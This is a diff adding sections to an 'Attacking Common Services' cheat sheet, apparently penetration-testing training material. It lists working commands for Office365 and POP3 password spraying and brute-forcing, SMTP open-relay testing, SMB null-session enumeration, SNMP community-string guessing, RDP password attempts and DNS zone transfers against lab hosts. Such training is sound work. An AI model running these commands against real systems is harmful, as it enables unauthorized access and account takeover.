@@ -1,3 +1,7 @@
+# Attacking Common Services
+
+Focus on enumeration first, then targeted attacks. Many services have modern secure defaults; look for legacy or misconfigured instances.
+
 ## Attacking FTP
 
 |**Command**|**Description**|
@@ -98,3 +102,33 @@
 | `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` | Password spraying against a list of users that use Office365 for the specified domain. |
 | `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` | Brute-forcing the POP3 service. |
 | `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability. |
+
+## 2026 Notes for Common Services
+
+- SNMP: still often weak community strings (`public`, `private`). Use `onesixtyone` + `snmpwalk`.
+- SMB / WinRM / RDP: NetExec, evil-winrm, xfreerdp, Kerberos attacks.
+- DNS: zone transfers rare; focus subenum + records for internal IPs.
+- Email: o365spray / MSOLSpray for cloud; on-prem still hydra + user enum.
+- Always combine with web/app layer attacks on admin interfaces.
+
+Use `nuclei` templates for quick wins on common services.
+
+### More Examples
+
+```bash
+# SMB enumeration + null session
+smbclient -L //target -N
+enum4linux -a target
+nxc smb target -u '' -p '' --shares --users
+
+# SNMP
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target
+snmpwalk -v1 -c public target 1.3.6.1.2.1.25.1.6.0
+
+# RDP + password spray (slow)
+xfreerdp /v:target /u:admin /p:'Password1' /cert-ignore
+
+# DNS zone transfer attempts
+dig axfr @ns1.target.com target.com
+host -t axfr target.com ns.target.com
+```
